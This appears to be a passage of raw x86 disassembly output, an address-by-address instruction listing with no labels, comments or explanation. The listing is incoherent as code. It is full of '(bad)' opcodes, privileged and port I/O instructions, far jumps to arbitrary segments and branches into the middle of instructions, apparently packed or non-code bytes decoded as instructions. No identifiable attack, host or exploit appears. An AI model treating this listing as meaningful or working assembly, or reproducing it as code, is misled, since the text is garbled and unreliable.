  430b07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430b0d:	add    cl,dh
  430b0f:	dec    ebp
  430b10:	dec    DWORD PTR [ebx-0x2c031b01]
  430b16:	inc    ebp
  430b17:	push   ebp
  430b18:	dec    DWORD PTR [ebx-0x73ff2734]
  430b1e:	lea    ebx,[ebx-0x7400cdac]
  430b24:	push   eax
  430b25:	mov    ah,0x45
  430b27:	push   ebp
  430b28:	mov    esi,DWORD PTR [ebx]
  430b2a:	les    esi,FWORD PTR [ebx]
  430b2c:	add    BYTE PTR [ebx],al
  430b2e:	inc    DWORD PTR [ebx]
  430b30:	mov    ecx,DWORD PTR [edi]
  430b32:	cld    
  430b33:	retf   0x4d80
  430b36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430b3c:	jne    0x430ac9
  430b3e:	jmp    eax
  430b40:	ror    bl,1
  430b42:	or     cl,dh
  430b44:	add    BYTE PTR [edi-0xf2f7475],ch
  430b4a:	not    bl
  430b4c:	adc    al,0xca
  430b4e:	inc    ebp
  430b4f:	push   ebp
  430b50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430b56:	push   0xaf80d6
  430b5b:	mov    eax,DWORD PTR [eax]
  430b5d:	in     al,0xff
  430b5f:	sti    
  430b60:	sbb    dh,cl
  430b62:	pop    esi
  430b63:	xchg   esp,eax
  430b64:	leave  
  430b65:	fwait
  430b66:	add    al,0x32
  430b68:	push   ebp
  430b69:	cmp    ebp,esp
  430b6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430b6f:	dec    DWORD PTR [ecx-0x740f0375]
  430b75:	push   ebp
  430b76:	cld    
  430b77:	xor    ebp,ebx
  430b79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430b7f:	push   ebp
  430b80:	clc    
  430b81:	xor    esi,ecx
  430b83:	add    esi,DWORD PTR [ebp-0x75]
  430b86:	(bad)  
  430b87:	hlt    
  430b88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430b8f:	mov    DWORD PTR [esi],eax
  430b91:	hlt    
  430b92:	(bad)  
  430b93:	dec    ebp
  430b94:	add    esi,DWORD PTR [ebx]
  430b96:	(bad)  
  430b97:	mov    edx,0xffc68d0a
  430b9c:	add    dl,cl
  430b9e:	leave  
  430b9f:	push   ebp
  430ba0:	push   ebp
  430ba1:	mov    ebp,esp
  430ba3:	fcom   QWORD PTR [ecx+0x7d]
  430ba6:	inc    ebp
  430ba7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430bad:	iret   
  430bae:	cld    
  430baf:	retf   0x868f
  430bb2:	loopne 0x430bb1
  430bb4:	mov    edi,edi
  430bb6:	mov    esi,DWORD PTR [ebp-0x8]
  430bb9:	mov    esi,eax
  430bbb:	cld    
  430bbc:	jne    0x430b6e
  430bbe:	mov    BYTE PTR [ecx],0xa
  430bc1:	add    dh,al
  430bc3:	test   DWORD PTR [eax],ecx
  430bc5:	inc    esi
  430bc7:	inc    DWORD PTR [edi]
  430bc9:	mov    eax,esi
  430bcb:	cld    
  430bcc:	add    DWORD PTR [eax+0x901c6],eax
  430bd2:	leave  
  430bd3:	xor    BYTE PTR [ebp+0x45],dl
  430bd6:	in     al,dx
  430bd7:	mov    edx,DWORD PTR [ecx-0x40]
  430bda:	inc    ebp
  430bdb:	add    BYTE PTR [ecx-0x74000301],cl
  430be1:	int3   
  430be2:	cld    
  430be3:	jne    0x430b9d
  430be5:	call   0xcc1ef0
  430bea:	mov    esi,DWORD PTR [ebp-0x8]
  430bed:	test   eax,esi
  430bef:	je     0x430c66
  430bf1:	mov    eax,esi
  430bf3:	cld    
  430bf4:	add    al,0x80
  430bf6:	add    WORD PTR [ecx+0x0],ax
  430bfa:	fiadd  DWORD PTR [eax]
  430bfc:	mov    BYTE PTR [eax],0x3d
  430bff:	push   0xffffffc3
  430c01:	push   esi
  430c02:	mov    edx,DWORD PTR [eax+0x51]
  430c05:	pop    edi
  430c06:	lea    ebx,[ebx-0x8]
  430c09:	ret    0x45
  430c0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c12:	xchg   eax,edi
  430c14:	mov    DWORD PTR [ebp-0x75],ecx
  430c17:	push   esi
  430c18:	clc    
  430c19:	jne    0x430beb
  430c1b:	mov    ecx,0xf8450b0b
  430c20:	(bad)  
  430c21:	push   cs
  430c22:	or     BYTE PTR [ebp-0x3a],dh
  430c25:	cmp    eax,DWORD PTR [ecx]
  430c27:	pop    esi
  430c28:	(bad)  
  430c29:	or     al,0x5
  430c2b:	inc    eax
  430c2c:	leave  
  430c2d:	jmp    0x40cf:0x25564204
  430c34:	leave  
  430c35:	in     eax,dx
  430c36:	inc    DWORD PTR [eax-0x75]
  430c39:	fimul  DWORD PTR [ebx-0x228139be]
  430c3f:	inc    eax
  430c40:	nop
  430c41:	loopne 0x430c42
  430c43:	ret    
  430c44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c4a:	add    eax,0xff45e8f8
  430c4f:	push   esi
  430c50:	push   DWORD PTR [ebp-0x39]
  430c53:	mov    eax,0x7edda46
  430c58:	or     al,0x6
  430c5a:	push   DWORD PTR [ebp-0x3a]
  430c5d:	cmp    eax,DWORD PTR [edx]
  430c5f:	pop    esi
  430c60:	ret    
  430c61:	or     al,0x56
  430c63:	inc    ecx
  430c64:	push   ebp
  430c65:	jle    0x430c53
  430c67:	inc    edx
  430c68:	inc    ebp
  430c69:	int    0x1
  430c6b:	inc    ecx
  430c6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430c72:	add    DWORD PTR [edx+0x1c],eax
  430c75:	retf   0xc38b
  430c78:	adc    al,0x8b
  430c7a:	xchg   edx,eax
  430c7b:	push   ecx
  430c7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430c82:	rcl    DWORD PTR [esi-0x9],cl
  430c85:	jne    0x430cd7
  430c87:	mov    eax,0x7c80ece
  430c8c:	rol    DWORD PTR [esi],cl
  430c8e:	div    DWORD PTR [ebp+0x50]
  430c91:	cmp    ecx,edx
  430c93:	pop    esi
  430c94:	dec    BYTE PTR [edx]
  430c96:	in     al,dx
  430c97:	inc    edx
  430c98:	sub    esp,ecx
  430c9a:	inc    eax
  430c9b:	(bad)  
  430c9c:	push   eax
  430c9d:	add    edx,DWORD PTR [eax-0x1f]
  430ca0:	push   edi
  430ca1:	add    dh,dh
  430ca3:	leave  
  430ca4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430ca8:	add    BYTE PTR [ecx+0x0],dl
  430cab:	inc    ebp
  430cac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430cb2:	add    BYTE PTR [eax-0x7fbf448],bh
  430cb8:	add    al,0x2
  430cba:	jmp    0x57eb814
  430cbf:	jne    0x430ca9
  430cc1:	mov    eax,DWORD PTR [edx]
  430cc3:	or     BYTE PTR [eax],al
  430cc5:	inc    ecx
  430cc6:	stc    
  430cc7:	in     eax,dx
  430cc8:	ss inc eax
  430cca:	aas    
  430ccb:	out    0x7d,eax
  430ccd:	inc    ecx
  430cce:	mov    ebp,ecx
  430cd0:	lock ret 0x7d
  430cd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430cda:	add    bh,bh
  430cdc:	aad    0xd7
  430cde:	add    dh,cl
  430ce0:	clts   
  430ce2:	(bad)  
  430ce3:	call   0xffce0be8
  430ce8:	hlt    
  430ce9:	iret   
  430cea:	jge    0x430cc2
  430cec:	rol    DWORD PTR [esi-0x80],cl
  430cef:	jmp    0x1c5bfc
  430cf4:	out    dx,al
  430cf5:	mov    eax,DWORD PTR [ebx]
  430cf7:	(bad)  
  430cf8:	pop    esi
  430cf9:	push   es
  430cfa:	cmp    al,0xe8
  430cfc:	sar    edi,0x8
  430cff:	inc    DWORD PTR [edi]
  430d01:	inc    esi
  430d02:	(bad)  
  430d03:	loopne 0x430d83
  430d05:	push   edi
  430d06:	push   cs
  430d07:	push   ebx
  430d08:	add    BYTE PTR [ebx+0x24008b56],cl
  430d0e:	add    BYTE PTR [ebp+0x50],al
  430d11:	push   eax
  430d12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d18:	sub    edx,DWORD PTR [esi-0x24]
  430d1b:	jne    0x430cd3
  430d1d:	lods   eax,DWORD PTR ds:[esi]
  430d1e:	mov    edx,DWORD PTR [edx-0x34]
  430d21:	dec    esi
  430d22:	out    0x83,eax
  430d24:	into   
  430d25:	push   edi
  430d27:	loopne 0x430cf7
  430d29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d34:	rol    DWORD PTR [edx],0x8
  430d37:	mov    esp,ecx
  430d39:	cmp    DWORD PTR [ebx],0xc
  430d3c:	mov    esi,0x5001c0
  430d41:	push   eax
  430d42:	push   cs
  430d43:	push   eax
  430d44:	(bad)  
  430d45:	sub    edx,edi
  430d47:	push   esi
  430d48:	adc    al,0xcb
  430d4a:	ins    DWORD PTR es:[edi],dx
  430d4b:	mov    eax,0x203e8
  430d50:	add    al,ah
  430d52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d59:	add    dh,al
  430d5b:	add    ah,ch
  430d5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d63:	pop    ecx
  430d64:	or     eax,ebx
  430d66:	cli    
  430d67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d6d:	lea    ebp,[ebx]
  430d6f:	mov    edx,DWORD PTR [edx-0x4]
  430d72:	dec    ecx
  430d73:	inc    ebp
  430d74:	shr    BYTE PTR [ebx],0x4b
  430d77:	and    al,0x0
  430d79:	(bad)  
  430d7a:	jne    0x430dc1
  430d7c:	pop    eax
  430d7d:	mov    al,0x5a
  430d7f:	call   0x1420fde
  430d84:	and    al,0x85
  430d86:	push   edx
  430d87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d8b:	dec    ebp
  430d8c:	mov    cl,0x23
  430d8e:	jmp    0x430d7c
  430d90:	mov    al,0xe7
  430d92:	call   0x1391080
  430d97:	shr    DWORD PTR [eax+ebx*2],cl
  430d9a:	lock (bad) 
  430d9c:	adc    eax,0x757f008d
  430da1:	out    0x58,eax
  430da3:	cmp    al,0x7
  430da5:	pop    edx
  430da6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dad:	push   ecx
  430dae:	cld    
  430daf:	mov    esi,0x3b0175
  430db4:	and    al,0xb0
  430db6:	xor    BYTE PTR [edx+0x1],0x8b
  430dba:	add    ah,bh
  430dbc:	mov    edi,DWORD PTR [ebp-0x4]
  430dbf:	psubsw mm7,QWORD PTR [edi]
  430dc2:	add    DWORD PTR [ebp+0x0],ebp
  430dc5:	rcr    eax,1
  430dc7:	mov    edi,ecx
  430dc9:	and    eax,DWORD PTR [eax]
  430dcb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430dd1:	call   0x13010ba
  430dd6:	add    al,cl
  430dd8:	mov    ebp,esi
  430dda:	aam    0x83
  430ddc:	or     DWORD PTR [ecx],eax
  430dde:	jne    0x430dd1
  430de0:	mov    eax,DWORD PTR [eax]
  430de2:	aam    0x0
  430de4:	dec    ebp
  430de5:	jne    0x430d72
  430de7:	cmp    ebx,eax
  430de9:	jb     0x430e38
  430deb:	jmp    0x430d78
  430ded:	mov    ebx,esp
  430def:	int3   
  430df0:	dec    ebp
  430df1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430df8:	mov    edx,0x8b0a8b
  430dfd:	cmp    ecx,DWORD PTR [eax]
  430dff:	jb     0x430dd8
  430e01:	pop    edx
  430e02:	push   edi
  430e03:	cli    
  430e04:	pop    es
  430e05:	mov    eax,ecx
  430e07:	jb     0x430e0b
  430e09:	add    DWORD PTR [ebx],0xa
  430e0c:	mov    eax,DWORD PTR [ebx]
  430e0e:	int3   
  430e0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e15:	jmp    0x430da2
  430e17:	mov    al,0xe8
  430e19:	call   0x104109b
  430e1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430e21:	pop    edi
  430e22:	or     BYTE PTR [ecx-0x73],bl
  430e25:	pop    ecx
  430e26:	inc    edi
  430e27:	xor    al,0xeb
  430e29:	push   ecx
  430e2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e30:	call   0xb20f35
  430e35:	int3   
  430e36:	sbb    BYTE PTR [esi],ch
  430e38:	inc    ebp
  430e39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e3f:	call   0x9c10ae
  430e44:	or     BYTE PTR [ebx-0x73],dl
  430e47:	cmp    al,0x47
  430e49:	mov    al,0x1
  430e4b:	jb     0x430e4d
  430e4d:	mov    al,0x10
  430e4f:	push   eax
  430e50:	add    al,0x75
  430e52:	add    BYTE PTR [ebx],ch
  430e54:	add    ebx,esp
  430e56:	int3   
  430e57:	jne    0x430e69
  430e59:	movsx  edx,cl
  430e5c:	add    DWORD PTR [eax],eax
  430e5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e65:	mov    gs,edi
  430e67:	add    BYTE PTR [eax-0x50],ch
  430e6a:	add    al,ch
  430e6c:	mov    eax,DWORD PTR [ecx]
  430e6e:	sub    eax,DWORD PTR [eax]
  430e70:	jb     0x430ee7
  430e72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e76:	jge    0x430e60
  430e78:	add    al,0x1
  430e7a:	add    DWORD PTR [eax],0x0
  430e7d:	jne    0x430e7f
  430e7f:	je     0x430ec6
  430e81:	mov    eax,DWORD PTR [edi]
  430e83:	ror    BYTE PTR [ebp+0x4d],1
  430e86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430e8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430e93:	mov    DWORD PTR [ebx],ebp
  430e95:	fadd   DWORD PTR [eax+0x75]
  430e98:	inc    eax
  430e99:	pop    eax
  430e9a:	lea    ebx,[ecx+0x4f]
  430e9d:	push   0xb1000003
  430ea2:	out    dx,eax
  430ea3:	add    ebp,DWORD PTR [edx+edx*2]
  430ea6:	add    BYTE PTR [ebx+ecx*4],bh
  430ea9:	mov    ch,BYTE PTR [ebx]
  430eab:	jb     0x430f1f
  430ead:	add    al,0x89
  430eaf:	push   eax
  430eb0:	call   0x842b5c22
  430eb5:	add    DWORD PTR [eax+eax*1],eax
  430eb8:	jae    0x430ece
  430eba:	icebp  
  430ebb:	inc    ebp
  430ebc:	mov    eax,DWORD PTR gs:[ecx]
  430ebf:	int3   
  430ec0:	out    dx,al
  430ec1:	loopne 0x430f10
  430ec3:	sub    eax,DWORD PTR [edx]
  430ec5:	push   0xffffff83
  430ec7:	pop    esi
  430ec8:	push   cs
  430ec9:	jl     0x430ee4
  430ecb:	add    al,0xaf
  430ecd:	xor    eax,0x832b6d00
  430ed2:	mov    eax,DWORD PTR [edx]
  430ed4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ee0:	inc    ebp
  430ee1:	shr    ebx,0x3
  430ee4:	or     DWORD PTR [eax],0x4
  430ee7:	push   0xffffffa5
  430ee9:	pop    esi
  430eea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ef1:	jmp    0x430f50
  430ef3:	mov    edi,0xff0272
  430ef8:	fdivr  QWORD PTR [ebp+0x5d]
  430efb:	push   0x4e
  430efd:	pop    ecx
  430efe:	call   0x435303
  430f03:	mov    DWORD PTR [ebx],eax
  430f05:	in     al,0xc8
  430f07:	rol    BYTE PTR [ebp-0x75],0xc1
  430f0b:	call   0xad10ec
  430f10:	pop    esi
  430f11:	enter  0xceff,0x8b
  430f15:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f19:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f20:	je     0x430f22
  430f22:	or     DWORD PTR [ebx-0x74183b24],eax
  430f28:	jne    0x430f0e
  430f2a:	jmp    0x430f25
  430f2c:	push   DWORD PTR [edx-0x24]
  430f2f:	push   0x4d
  430f31:	pop    ecx
  430f32:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f36:	jge    0x430f3e
  430f38:	mov    eax,eax
  430f3a:	sub    ebp,DWORD PTR [edx+0x24]
  430f3d:	pop    esi
  430f3e:	inc    ebp
  430f3f:	mov    esp,0x8b6077
  430f44:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f4a:	lods   al,BYTE PTR ds:[esi]
  430f4b:	add    BYTE PTR [ebx],bh
  430f4d:	enter  0xce73,0x49
  430f51:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f59:	stc    
  430f5a:	jge    0x430fce
  430f5c:	jnp    0xdd4292cb
  430f62:	call   0xc61038
  430f67:	fadd   st(0),st
  430f69:	dec    esi
  430f6a:	ins    BYTE PTR es:[edi],dx
  430f6b:	stc    
  430f6c:	cmp    al,0x73
  430f6e:	push   ebp
  430f6f:	mov    eax,0xf8028b
  430f74:	jne    0x430f37
  430f76:	mov    esi,ecx
  430f78:	mov    esp,DWORD PTR [ebp+0x2c]
  430f7b:	add    edi,DWORD PTR [ebp-0x24]
  430f7e:	sub    esp,eax
  430f80:	and    al,0x45
  430f82:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f88:	sbb    al,0xee
  430f8a:	pop    esi
  430f8b:	call   0x830fbb
  430f90:	fsubr  st,st(3)
  430f92:	sti    
  430f93:	add    BYTE PTR gs:[ecx],bh
  430f96:	add    eax,esp
  430f98:	add    DWORD PTR [esi],eax
  430f9a:	rol    DWORD PTR [ebp+0x8],0x29
  430f9e:	mov    esp,eax
  430fa0:	clc    
  430fa1:	jne    0x431018
  430fa3:	mov    eax,0x8b0673
  430fa8:	loopne 0x430fef
  430faa:	loopne 0x430f35
  430fac:	lods   al,BYTE PTR ds:[esi]
  430fad:	int3   
  430fae:	inc    ebp
  430faf:	mov    DWORD PTR gs:[eax+edi*8],eax
  430fb3:	add    al,0xc3
  430fb5:	sub    ecx,DWORD PTR [ebp+0x47]
  430fb8:	(bad)  
  430fba:	shr    BYTE PTR [ebp-0x1f],0xe8
  430fbe:	add    eax,DWORD PTR [eax]
  430fc0:	call   0x644d0c5
  430fc5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430fcb:	dec    esi
  430fcc:	ins    DWORD PTR es:[edi],dx
  430fcd:	in     al,dx
  430fce:	lea    eax,[eax]
  430fd0:	inc    ebp
  430fd1:	inc    ebp
  430fd2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fd8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430fe2:	and    al,0xdc
  430fe4:	ror    DWORD PTR [edx+0x24],0xf7
  430fe8:	or     BYTE PTR [ebp+0x4c],dh
  430feb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430fef:	stos   BYTE PTR es:[edi],al
  430ff0:	adc    edx,edi
  430ff2:	inc    esp
  430ff3:	add    edi,DWORD PTR [eax]
  430ff5:	jne    0x430fda
  430ff7:	mov    DWORD PTR [eax-0x7449db04],ecx
  430ffd:	cmp    ecx,DWORD PTR [edi]
  430fff:	sub    BYTE PTR [ebp-0x7e],dl
  431002:	sar    ebp,0xb
  431005:	jmp    FWORD PTR [edi+0x2400392a]
  43100b:	sub    esi,DWORD PTR [ebx-0x73]
  43100e:	mov    esp,DWORD PTR [ecx+edi*4]
  431011:	mov    ecx,DWORD PTR [eax]
  431013:	and    BYTE PTR [eax],al
  431015:	jne    0x430fe1
  431017:	sub    ebp,ecx
  431019:	sbb    BYTE PTR [esi+0x32],ah
  43101c:	dec    ebp
  43101d:	push   ebp
  43101e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431024:	ret    
  431025:	mov    edx,ebp
  431027:	leave  
  431028:	sub    DWORD PTR [esi+0x24],ebx
  43102b:	ret    0x2b
  43102e:	pop    ax
  431030:	push   ebp
  431031:	rol    BYTE PTR [ebx],0xeb
  431034:	add    DWORD PTR [ecx+0x6c0001],0x40
  43103b:	jb     0x431092
  43103d:	ret    
  43103e:	in     al,dx
  43103f:	jecxz  0x430fcc
  431041:	push   esi
  431042:	xchg   esp,eax
  431043:	jne    0x431045
  431045:	cmp    edx,DWORD PTR [esi+0x1c]
  431048:	jne    0x43102e
  43104a:	mov    eax,DWORD PTR [ebp-0x77]
  43104d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431054:	mov    esi,DWORD PTR [ebp-0x75]
  431057:	pop    esi
  431058:	nop
  431059:	mov    eax,DWORD PTR [eax]
  43105b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431061:	add    al,0x0
  431063:	inc    ebp
  431064:	mov    eax,DWORD PTR [ebx]
  431066:	mov    ebp,ebx
  431068:	cmp    al,0xf
  43106a:	or     al,al
  43106c:	inc    ebp
  43106d:	inc    ebp
  43106e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431074:	cld    
  431075:	add    BYTE PTR [edi+0x546c16c0],dh
  43107b:	add    BYTE PTR [ecx-0x5],dl
  43107e:	add    eax,0x17200
  431083:	sbb    al,0x85
  431085:	dec    esp
  431086:	je     0x4310c0
  431088:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43108c:	add    BYTE PTR [ebx],bh
  43108e:	(bad)  
  43108f:	and    al,0x32
  431091:	jae    0x43102f
  431093:	mov    cl,cl
  431095:	inc    DWORD PTR [esp]
  431098:	push   ebp
  431099:	shr    esp,0x8
  43109c:	in     al,dx
  43109d:	push   esp
  43109e:	add    DWORD PTR [eax],esp
  4310a0:	add    bl,cl
  4310a2:	inc    ebp
  4310a3:	mov    bh,0x89
  4310a5:	add    ah,bh
  4310a7:	jmp    0xca751ff1
  4310ac:	pushf  
  4310ad:	dec    esp
  4310ae:	mov    edx,0xf8178520
  4310b3:	fst    DWORD PTR [ebp+0x0]
  4310b6:	mov    BYTE PTR [eax],0xc4
  4310b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4310bc:	inc    ebp
  4310bd:	add    eax,0xc601da
  4310c2:	mov    al,0xc6
  4310c5:	ins    BYTE PTR es:[edi],dx
  4310c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4310cd:	dec    esp
  4310ce:	jmp    DWORD PTR [eax]
  4310d0:	inc    ebp
  4310d1:	fnstcw WORD PTR [esi+0x29]
  4310d4:	test   BYTE PTR [eax],0xc8
  4310d7:	rol    BYTE PTR [eax],0xc0
  4310da:	lea    ecx,[ebp-0x3cf0dbcb]
  4310e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4310e6:	inc    esi
  4310e7:	add    DWORD PTR [eax],ebx
  4310e9:	add    dh,bh
  4310eb:	mov    esi,DWORD PTR [edx+0x8]
  4310ee:	(bad)  
  4310ef:	fdiv   QWORD PTR ss:[ecx]
  4310f2:	(bad)  
  4310f3:	mov    bl,ch
  4310f5:	add    esi,eax
  4310f7:	add    dh,bl
  4310f9:	or     esi,eax
  4310fb:	mov    dl,0xdf
  4310fd:	add    esi,eax
  4310ff:	add    al,ah
  431101:	push   cs
  431102:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431109:	or     BYTE PTR [ebx],dh
  43110b:	dec    ecx
  43110c:	lea    eax,[ebx]
  43110e:	xor    eax,0x18fc0fc7
  431113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431114:	repz clc 
  431116:	add    eax,DWORD PTR [ebp+0x46]
  431119:	prefetcht0 BYTE PTR [ecx-0x2]
  43111d:	xor    eax,0x7c60872
  431122:	mov    esp,0xbd32c69b
  431127:	pop    esi
  431128:	mov    cl,0xbe
  43112b:	or     al,0xc6
  43112d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431134:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43113b:	add    dh,al
  43113d:	mov    eax,ebx
  43113f:	xor    DWORD PTR [ebx],0x35008dbc
  431145:	mov    ecx,DWORD PTR [edi]
  431147:	sbb    al,0x18
  431149:	inc    ebp
  43114a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431151:	clc    
  431152:	(bad)  
  431153:	xor    DWORD PTR [edx-0x64],esi
  431156:	lea    ecx,[ecx+0x45ffe838]
  43115c:	mov    ecx,ebx
  43115e:	fadd   st,st(6)
  431160:	dec    ebp
  431161:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431167:	out    0x1,eax
  431169:	inc    ebp
  43116a:	lea    ebp,ds:0xc8ffc6ff
  431170:	enter  0xa33,0xc6
  431174:	push   ebp
  431175:	leave  
  431176:	(bad)  
  431177:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43117d:	add    BYTE PTR [ebp+0x44],al
  431180:	mov    eax,esp
  431182:	mov    WORD PTR [esi+0x46398300],?
  431188:	psubusw mm4,QWORD PTR [esi-0x78]
  43118c:	add    BYTE PTR [ebx-0x1303f975],al
  431192:	add    BYTE PTR [ebp+0x1],0xeb
  431196:	add    BYTE PTR [ebp+0x38],al
  431199:	in     eax,dx
  43119a:	inc    ebp
  43119b:	inc    ebp
  43119c:	mov    ebx,ebx
  43119e:	add    BYTE PTR [ebp+0x0],0xec
  4311a2:	mov    DWORD PTR [ebp-0x41],eax
  4311a5:	sub    eax,0x2c00454e
  4311aa:	ins    DWORD PTR es:[edi],dx
  4311ab:	inc    ebp
  4311ac:	add    BYTE PTR [esi+0x66],bh
  4311af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4311b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4311c0:	dec    edi
  4311c1:	pop    es
  4311c2:	add    ah,ch
  4311c4:	mov    DWORD PTR [ebp+0x68],eax
  4311c7:	in     eax,dx
  4311c8:	inc    DWORD PTR [ebp-0x7d]
  4311cb:	out    0xc0,al
  4311cd:	inc    ebp
  4311ce:	mov    edx,esp
  4311d0:	push   0x45
  4311d2:	(bad)  
  4311d3:	jmp    0xdf925790
  4311d8:	add    BYTE PTR [ebp-0x77],al
  4311db:	out    dx,al
  4311dc:	ins    BYTE PTR es:[edi],dx
  4311dd:	inc    ebp
  4311de:	jmp    edi
  4311e0:	add    DWORD PTR [ebp-0x14],0x7e
  4311e4:	mov    esi,esi
  4311e6:	outs   dx,BYTE PTR ds:[esi]
  4311e7:	inc    esp
  4311e8:	(bad)  
  4311e9:	mov    esp,0x8341b68d
  4311ee:	mov    DWORD PTR [esi+0x70],eax
  4311f1:	fcos   
  4311f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4311f9:	in     al,dx
  4311fa:	jb     0x431181
  4311fc:	(bad)  
  4311fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431203:	mov    edi,edi
  431205:	fdivr  st,st(7)
  431207:	out    dx,eax
  431208:	rcl    BYTE PTR [ebx],0x66
  43120b:	mov    DWORD PTR [ebp-0xc70075],eax
  431211:	(bad)  
  431212:	std    
  431213:	cmp    eax,DWORD PTR [eax]
  431215:	jne    0x43127d
  431217:	mov    DWORD PTR [ebp-0xba0048],eax
  43121d:	in     al,dx
  43121e:	outs   dx,BYTE PTR ds:[esi]
  43121f:	pushf  
  431220:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431226:	inc    DWORD PTR [ecx]
  431228:	inc    DWORD PTR [eax]
  43122a:	jae    0x431264
  43122c:	add    BYTE PTR [ebp+0x850266],al
  431232:	inc    DWORD PTR [ebp-0x1]
  431235:	mov    eax,eax
  431237:	jl     0x43129f
  431239:	add    BYTE PTR [ebp-0x740077],al
  43123f:	cld    
  431240:	dec    eax
  431241:	add    BYTE PTR [eax],0x1
  431244:	data16 add BYTE PTR [ebp+0x38],al
  431248:	mov    eax,0x47c2
  43124d:	mov    eax,0x824f89
  431252:	inc    edi
  431253:	mov    DWORD PTR [edx+0x64],ebp
  431256:	inc    WORD PTR [ebp-0x75]
  43125a:	(bad)  
  43125b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431262:	inc    ebp
  431263:	jge    0x431244
  431265:	add    bh,ah
  431267:	lea    ax,[ebp-0x750030]
  43126e:	add    al,0x46
  431271:	jmp    0x40ff:0x8885
  431277:	push   DWORD PTR [ebp+0x52]
  43127a:	lea    eax,[eax]
  43127c:	shl    BYTE PTR [esi-0x7b],1
  43127f:	test   esi,edi
  431281:	(bad)  
  431282:	(bad)  
  431283:	inc    DWORD PTR [ebp-0x990140]
  431289:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43128f:	inc    edi
  431290:	push   ecx
  431291:	xor    ax,WORD PTR [ebp-0x8d0045]
  431298:	add    al,al
  43129a:	ret    
  43129b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4312a2:	push   eax
  4312a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4312aa:	add    BYTE PTR [ebx-0x764f8839],al
  4312b0:	push   DWORD PTR [esi+0x1]
  4312b3:	inc    DWORD PTR [eax]
  4312b5:	mov    eax,0xff99ff
  4312ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4312c0:	jne    0x43127a
  4312c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4312cc:	mov    ecx,0xd74fb8
  4312d1:	add    cl,al
  4312d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4312d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4312e0:	(bad)  
  4312e1:	push   ebp
  4312e3:	mov    eax,0x8c2789
  4312e8:	ret    0x6689
  4312eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4312ef:	add    bh,ah
  4312f1:	mov    WORD PTR [ebp-0x70],ax
  4312f5:	(bad)  
  4312f6:	ret    0x667d
  4312f9:	or     BYTE PTR [ebp-0x77],dl
  4312fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431303:	loop   0x43128e
  431305:	(bad)  
